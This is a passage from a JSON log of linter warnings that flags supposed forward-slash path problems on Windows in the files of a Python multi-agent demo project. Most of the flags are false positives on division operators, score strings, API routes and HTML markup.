      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 307: Forward slash in path - ']) \n                                     / before_metrics['",
        "timestamp": "2025-09-05T17:30:42.177744"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 472: Forward slash in path - '{((total_roi - 0.8) / 0.8) * 100:.0f}%'",
        "timestamp": "2025-09-05T17:30:42.177859"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 576: Forward slash in path - \"\n        Act VI: Business Transformation (14-17 minutes)\n        \n        Demonstration: End-to-end autonomous workflow automation with\n        invoice processing pipeline, quality assurance checkpoints,\n        ROI dashboard, and before/after comparisons.\n        \"",
        "timestamp": "2025-09-05T17:30:42.177948"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 634: Forward slash in path - '] = roi_metrics\n        \n        # Before/after comparison\n        before_after = {\n            '",
        "timestamp": "2025-09-05T17:30:42.178002"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 732: Forward slash in path - 'Enterprise Grade Security: 100/100'",
        "timestamp": "2025-09-05T17:30:42.178083"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 733: Forward slash in path - 'Performance Excellence: Grade A (90+/100)'",
        "timestamp": "2025-09-05T17:30:42.178105"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 779: Forward slash in path - '100/100'",
        "timestamp": "2025-09-05T17:30:42.178152"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 872: Forward slash in path - \"\n        total_duration = (datetime.now() - self.start_time).total_seconds()\n        \n        return SymphonyMetrics(\n            total_duration=total_duration,\n            acts_completed=len(self.act_performances),\n            overall_engagement=sum(p.engagement_score for p in self.act_performances) / len(self.act_performances),\n            technical_achievement=sum(p.technical_complexity for p in self.act_performances) / len(self.act_performances),\n            business_value_demonstrated=sum(p.business_impact for p in self.act_performances) / len(self.act_performances),\n            visual_impact_score=sum(p.visual_spectacle for p in self.act_performances) / len(self.act_performances),\n            user_satisfaction=sum(p.user_interaction for p in self.act_performances) / len(self.act_performances),\n            performance_improvement=1000.0  # 10x baseline improvement\n        )\n    \n    def _calculate_technical_score(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.178277"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 887: Forward slash in path - \"\n        return sum(p.technical_complexity for p in self.act_performances) / len(self.act_performances)\n    \n    def _calculate_business_impact(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.178312"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 891: Forward slash in path - \"\n        return sum(p.business_impact for p in self.act_performances) / len(self.act_performances)\n    \n    def _calculate_visual_impact(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.178341"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 895: Forward slash in path - \"\n        return sum(p.visual_spectacle for p in self.act_performances) / len(self.act_performances)\n    \n    def _generate_recovery_plan(self, error: Exception) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.178370"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 947: Forward slash in path - ']:.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.178470"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 948: Forward slash in path - ']:.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.178500"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 949: Forward slash in path - ']:.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.178528"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "warning": "Line 950: Forward slash in path - ']:.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.178555"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Line 99: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.179134"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Line 100: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.179145"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Line 101: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.179153"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Line 102: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.179160"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Line 109: Forward slash in path - \"  Duration: {act.duration:.2f}s | Engagement: {act.engagement_score:.1f}/10\"",
        "timestamp": "2025-09-05T17:30:42.179171"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Line 110: Forward slash in path - \"  Technical: {act.technical_complexity:.1f}/10 | Business: {act.business_impact:.1f}/10\"",
        "timestamp": "2025-09-05T17:30:42.179178"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Line 195: Forward slash in path - \"🏃 Benchmark Run {run + 1}/{benchmark_results['",
        "timestamp": "2025-09-05T17:30:42.179237"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Line 224: Forward slash in path - \"] for r in successful_runs) / len(successful_runs)\n    min_time = min(r[\"",
        "timestamp": "2025-09-05T17:30:42.179264"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "warning": "Line 229: Forward slash in path - \"Successful Runs: {len(successful_runs)}/{benchmark_results['",
        "timestamp": "2025-09-05T17:30:42.179276"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 145: Forward slash in path - \"90+/100 (Grade A)\"",
        "timestamp": "2025-09-05T17:30:42.179990"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 146: Forward slash in path - \"100/100\"",
        "timestamp": "2025-09-05T17:30:42.180003"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 196: Forward slash in path - \"  Gain:   +{improvement:.1f}% ({improvement/baseline_performance*100:.1f}% relative)\"",
        "timestamp": "2025-09-05T17:30:42.180040"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 261: Forward slash in path - ']}/10\"",
        "timestamp": "2025-09-05T17:30:42.180087"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 332: Forward slash in path - \"   Net ROI: {((total_roi - 0.8) / 0.8) * 100:.0f}%\"",
        "timestamp": "2025-09-05T17:30:42.180313"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 349: Forward slash in path - \"{((total_roi - 0.8) / 0.8) * 100:.0f}%\"",
        "timestamp": "2025-09-05T17:30:42.180343"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 369: Forward slash in path - \"\n        ]\n        \n        for i, phase in enumerate(coordination_phases):\n            progress = (i + 1) / len(coordination_phases) * 100\n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.180379"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 389: Forward slash in path - ']}/{results['",
        "timestamp": "2025-09-05T17:30:42.180404"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 513: Forward slash in path - \"✅ Enterprise Security: 100/100 Score\"",
        "timestamp": "2025-09-05T17:30:42.180640"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 514: Forward slash in path - \"✅ Performance Excellence: Grade A (90+/100)\"",
        "timestamp": "2025-09-05T17:30:42.180671"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 527: Forward slash in path - \"   🏅 Overall Success Score: 97.8/100\"",
        "timestamp": "2025-09-05T17:30:42.180708"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 545: Forward slash in path - \": duration\n        }\n    \n    def _calculate_audience_satisfaction(self) -> float:\n        if not self.act_performances:\n            return 0.0\n        return sum(p.engagement_score for p in self.act_performances) / len(self.act_performances)\n    \n    def _calculate_technical_achievement(self) -> float:\n        if not self.act_performances:\n            return 0.0\n        return sum(p.technical_complexity for p in self.act_performances) / len(self.act_performances)\n    \n    def _calculate_business_impact(self) -> float:\n        if not self.act_performances:\n            return 0.0\n        return sum(p.business_impact for p in self.act_performances) / len(self.act_performances)\n    \n    def _calculate_visual_spectacle(self) -> float:\n        if not self.act_performances:\n            return 0.0\n        return sum(p.visual_spectacle for p in self.act_performances) / len(self.act_performances)\n\n\nasync def run_standalone_demo(config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:\n    \"",
        "timestamp": "2025-09-05T17:30:42.180746"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 584: Forward slash in path - ', 0)}/7\"",
        "timestamp": "2025-09-05T17:30:42.180776"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 585: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.180794"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 586: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.180812"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 587: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.180830"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 588: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.180848"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 595: Forward slash in path - \"   🎯 Performance Score: 90+/100 (Grade A)\"",
        "timestamp": "2025-09-05T17:30:42.180871"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\standalone_demo.py",
        "warning": "Line 596: Forward slash in path - \"   🔒 Security Score: 100/100 (Enterprise Grade)\"",
        "timestamp": "2025-09-05T17:30:42.180891"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\visualization.py",
        "warning": "Line 172: Forward slash in path - \"Requests/Second\"",
        "timestamp": "2025-09-05T17:30:42.181545"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\visualization.py",
        "warning": "Line 211: Forward slash in path - ':\n                    # Network usage varying with business hours\n                    usage = 40 + 30 * math.sin(hour * math.pi / 12) + random.uniform(-5, 5)\n                else:\n                    usage = random.uniform(20, 70)\n                \n                row.append(max(0, min(100, usage)))\n            utilization_data.append(row)\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.181604"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 81: Forward slash in path - \"/api/docs\"",
        "timestamp": "2025-09-05T17:30:42.182313"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 82: Forward slash in path - \"/api/redoc\"",
        "timestamp": "2025-09-05T17:30:42.182323"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 105: Forward slash in path - \"\n        static_dir = Path(__file__).parent / \"",
        "timestamp": "2025-09-05T17:30:42.182339"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 106: Forward slash in path - \" / \"",
        "timestamp": "2025-09-05T17:30:42.182348"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 108: Forward slash in path - \"/static\"",
        "timestamp": "2025-09-05T17:30:42.182356"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 113: Forward slash in path - \"/\"",
        "timestamp": "2025-09-05T17:30:42.182366"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 119: Forward slash in path - \"/api/health\"",
        "timestamp": "2025-09-05T17:30:42.182377"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 124: Forward slash in path - \"/api/demo/start\"",
        "timestamp": "2025-09-05T17:30:42.182388"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 142: Forward slash in path - \"/api/demo/{session_id}/execute\"",
        "timestamp": "2025-09-05T17:30:42.182407"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 162: Forward slash in path - \"/api/demo/{session_id}/status\"",
        "timestamp": "2025-09-05T17:30:42.182428"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 177: Forward slash in path - \"/api/capabilities\"",
        "timestamp": "2025-09-05T17:30:42.182449"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 220: Forward slash in path - \"90+/100 (Grade A)\"",
        "timestamp": "2025-09-05T17:30:42.182492"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 221: Forward slash in path - \"100/100\"",
        "timestamp": "2025-09-05T17:30:42.182506"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 222: Forward slash in path - \"92.5/100 (Grade A+)\"",
        "timestamp": "2025-09-05T17:30:42.182518"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 223: Forward slash in path - \"90+/100\"",
        "timestamp": "2025-09-05T17:30:42.182531"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 228: Forward slash in path - \"/api/performance/metrics\"",
        "timestamp": "2025-09-05T17:30:42.182546"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 249: Forward slash in path - \"/ws/{session_id}\"",
        "timestamp": "2025-09-05T17:30:42.182572"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 371: Forward slash in path - \" />\n    <link rel=\"",
        "timestamp": "2025-09-05T17:30:42.182659"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 372: Forward slash in path - \"/favicon.ico\"",
        "timestamp": "2025-09-05T17:30:42.182678"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 373: Forward slash in path - \" />\n    <meta name=\"",
        "timestamp": "2025-09-05T17:30:42.182697"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 374: Forward slash in path - \" />\n    <meta name=\"",
        "timestamp": "2025-09-05T17:30:42.182717"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 375: Forward slash in path - \" />\n    <title>Autonomous Intelligence Symphony</title>\n    \n    <!-- Fonts -->\n    <link href=\"",
        "timestamp": "2025-09-05T17:30:42.182738"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 391: Forward slash in path - ', -apple-system, BlinkMacSystemFont, sans-serif;\n            background: linear-gradient(135deg, #0A0E27 0%, #1a1a2e 50%, #16213e 100%);\n            color: #ffffff;\n            overflow-x: hidden;\n            min-height: 100vh;\n        }\n        \n        .loading-screen {\n            position: fixed;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            background: linear-gradient(135deg, #0A0E27 0%, #1a1a2e 50%, #16213e 100%);\n            display: flex;\n            flex-direction: column;\n            justify-content: center;\n            align-items: center;\n            z-index: 9999;\n        }\n        \n        .logo {\n            font-size: 3rem;\n            font-weight: 700;\n            background: linear-gradient(45deg, #00FFFF, #FF00FF, #FFFF00);\n            -webkit-background-clip: text;\n            -webkit-text-fill-color: transparent;\n            animation: glow 2s ease-in-out infinite alternate;\n            text-align: center;\n            margin-bottom: 2rem;\n        }\n        \n        .subtitle {\n            font-size: 1.2rem;\n            color: #64B5F6;\n            margin-bottom: 3rem;\n            text-align: center;\n        }\n        \n        .loading-animation {\n            width: 60px;\n            height: 60px;\n            border: 3px solid rgba(255, 255, 255, 0.1);\n            border-top: 3px solid #00FFFF;\n            border-radius: 50%;\n            animation: spin 1s linear infinite;\n        }\n        \n        .stats-grid {\n            display: grid;\n            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));\n            gap: 1rem;\n            margin-top: 3rem;\n            max-width: 800px;\n        }\n        \n        .stat-card {\n            background: rgba(255, 255, 255, 0.05);\n            border: 1px solid rgba(255, 255, 255, 0.1);\n            border-radius: 8px;\n            padding: 1rem;\n            text-align: center;\n            backdrop-filter: blur(10px);\n        }\n        \n        .stat-value {\n            font-size: 1.5rem;\n            font-weight: 700;\n            color: #00FFFF;\n        }\n        \n        .stat-label {\n            font-size: 0.9rem;\n            color: #B0BEC5;\n            margin-top: 0.5rem;\n        }\n        \n        @keyframes glow {\n            0% { text-shadow: 0 0 20px rgba(0, 255, 255, 0.5); }\n            100% { text-shadow: 0 0 30px rgba(255, 0, 255, 0.8); }\n        }\n        \n        @keyframes spin {\n            0% { transform: rotate(0deg); }\n            100% { transform: rotate(360deg); }\n        }\n        \n        .start-button {\n            background: linear-gradient(45deg, #00FFFF, #FF00FF);\n            border: none;\n            color: #000;\n            font-size: 1.1rem;\n            font-weight: 600;\n            padding: 12px 32px;\n            border-radius: 25px;\n            cursor: pointer;\n            margin-top: 2rem;\n            transition: all 0.3s ease;\n        }\n        \n        .start-button:hover {\n            transform: translateY(-2px);\n            box-shadow: 0 10px 25px rgba(0, 255, 255, 0.3);\n        }\n    </style>\n</head>\n<body>\n    <div id=\"",
        "timestamp": "2025-09-05T17:30:42.182806"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 500: Forward slash in path - \">AUTONOMOUS INTELLIGENCE SYMPHONY</div>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.182831"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 501: Forward slash in path - \">Phase 7 Meta-Demo Showcase</div>\n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.182854"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 502: Forward slash in path - \"></div>\n            \n            <div class=\"",
        "timestamp": "2025-09-05T17:30:42.182878"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 506: Forward slash in path - \">100/100</div>\n                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.182903"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 507: Forward slash in path - \">Security Score</div>\n                </div>\n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.182926"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 510: Forward slash in path - \">Grade A</div>\n                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.182951"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 511: Forward slash in path - \">Performance</div>\n                </div>\n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.182975"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 514: Forward slash in path - \">10x</div>\n                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.182999"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 515: Forward slash in path - \">Speed Improvement</div>\n                </div>\n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183023"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 518: Forward slash in path - \">1,941%</div>\n                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183048"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 519: Forward slash in path - \">ROI Achievement</div>\n                </div>\n            </div>\n            \n            <button class=\"",
        "timestamp": "2025-09-05T17:30:42.183072"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 523: Forward slash in path - \">Begin Symphony</button>\n        </div>\n    </div>\n    \n    <script>\n        // Initialize demo\n        let socket = null;\n        let sessionId = null;\n        \n        async function startDemo() {\n            try {\n                // Create demo session\n                const response = await fetch('",
        "timestamp": "2025-09-05T17:30:42.183100"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 537: Forward slash in path - 'application/json'",
        "timestamp": "2025-09-05T17:30:42.183136"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 541: Forward slash in path - '\n                    })\n                });\n                \n                const data = await response.json();\n                sessionId = data.session_id;\n                \n                // Establish WebSocket connection\n                const wsProtocol = window.location.protocol === '",
        "timestamp": "2025-09-05T17:30:42.183167"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 549: Forward slash in path - ';\n                socket = new WebSocket(`${wsProtocol}//${window.location.host}/ws/${sessionId}`);\n                \n                socket.onopen = function(event) {\n                    console.log('",
        "timestamp": "2025-09-05T17:30:42.183194"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 555: Forward slash in path - \">SYMPHONY STARTING...</div>\n                        <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183222"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 556: Forward slash in path - \">Prepare for the ultimate demonstration</div>\n                        <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183248"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 557: Forward slash in path - \"></div>\n                    `;\n                    \n                    // Start the actual demo\n                    setTimeout(() => executeDemo(), 2000);\n                };\n                \n                socket.onmessage = function(event) {\n                    const message = JSON.parse(event.data);\n                    handleWebSocketMessage(message);\n                };\n                \n                socket.onerror = function(error) {\n                    console.error('",
        "timestamp": "2025-09-05T17:30:42.183281"
      },
      {
        "category": "WINDOWS_COMPAT",
